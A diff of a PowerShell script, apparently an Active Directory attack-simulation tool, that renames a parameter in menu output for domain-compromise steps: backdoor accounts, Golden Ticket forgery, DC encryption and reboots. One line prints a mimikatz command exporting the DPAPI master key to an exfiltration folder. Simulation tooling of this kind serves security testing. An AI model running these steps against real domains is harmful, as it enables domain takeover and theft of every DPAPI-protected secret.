@@ -89,7 +89,7 @@ function Start-Phase12DomainCompromise {
 
             "B" {
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -T Header -M "Create a backdoor account with elevated group memberships for persistence"
+                Invoke-Output -Type  Header -M "Create a backdoor account with elevated group memberships for persistence"
         
                 If ($UnAttended) {
                     $answer = $Script:Yes 
@@ -107,7 +107,7 @@ function Start-Phase12DomainCompromise {
             }
             "P" {
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -T Header -M "Purge all privileged group memberships"
+                Invoke-Output -Type  Header -M "Purge all privileged group memberships"
                 $answer = $Script:Yes
                 
                 If ($UnAttended) {
@@ -123,7 +123,7 @@ function Start-Phase12DomainCompromise {
             }
             "T" {
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -T Header -M "Manipulate Group Policy Templates (GPT) files"
+                Invoke-Output -Type  Header -M "Manipulate Group Policy Templates (GPT) files"
         
                 If ($UnAttended) {
                     $answer = $Script:Yes 
@@ -147,7 +147,7 @@ function Start-Phase12DomainCompromise {
             }
             "U" {
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -T Header -M "Disable user accounts or/and enforce password resets"
+                Invoke-Output -Type  Header -M "Disable user accounts or/and enforce password resets"
       
                 $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
                 $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)
@@ -176,10 +176,10 @@ function Start-Phase12DomainCompromise {
             "G" {
                 If (-not $SkipClearHost) { Clear-Host }
 
-                Invoke-Output -T Header -M "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
-                Invoke-output -T Bullet -M "Step 1: Dump the NTLM Hash for 'krbtgt' account"
-                Invoke-output -T Bullet -M "Step 2: Forge Golden Ticket"
-                Invoke-output -T Bullet -M "Step 3: Use the Golden Ticket to achieve unrestricted Kerberos dominance"
+                Invoke-Output -Type  Header -M "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
+                Invoke-Output -Type  Bullet -M "Step 1: Dump the NTLM Hash for 'krbtgt' account"
+                Invoke-Output -Type  Bullet -M "Step 2: Forge Golden Ticket"
+                Invoke-Output -Type  Bullet -M "Step 3: Use the Golden Ticket to achieve unrestricted Kerberos dominance"
     
                 If ($UnAttended) {
                     $answer = $Script:No 
@@ -197,7 +197,7 @@ function Start-Phase12DomainCompromise {
                 #region  Step - ran ransomware attack? 
                 #Pause
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -T Header -M "Encrypt critical Domain Controller assets for strategic leverage"
+                Invoke-Output -Type  Header -M "Encrypt critical Domain Controller assets for strategic leverage"
     
                 If ($UnAttended) {
                     $answer = $Script:Yes 
@@ -220,8 +220,8 @@ function Start-Phase12DomainCompromise {
 
                 If (-not $SkipClearHost) { Clear-Host }
 
-                Invoke-output -T Header -M "Export DATA PROTECTION API master key"
-                Invoke-output -T Bullet -M "Attackers can use the master key to decrypt ANY secret`n    protected by DPAPI on all domain-joined machines"
+                Invoke-Output -Type  Header -M "Export DATA PROTECTION API master key"
+                Invoke-Output -Type  Bullet -M "Attackers can use the master key to decrypt ANY secret`n    protected by DPAPI on all domain-joined machines"
                 Invoke-Output -Type CodeSnippet -Message "Command:"
 
                 Write-Highlight -Text ".\mimikatz.exe ", """cd $Script:DefautExfiltrationFolder"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$Script:ASDC.$Script:ASFQDN", " /export", """ ""exit"""  `
@@ -244,7 +244,7 @@ function Start-Phase12DomainCompromise {
             "R" {
                 #Pause
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -T Header -M "Trigger coordinated reboot across accessible Domain Controllers"
+                Invoke-Output -Type  Header -M "Trigger coordinated reboot across accessible Domain Controllers"
                 Restart-VictimMachines
             }
             "X" {
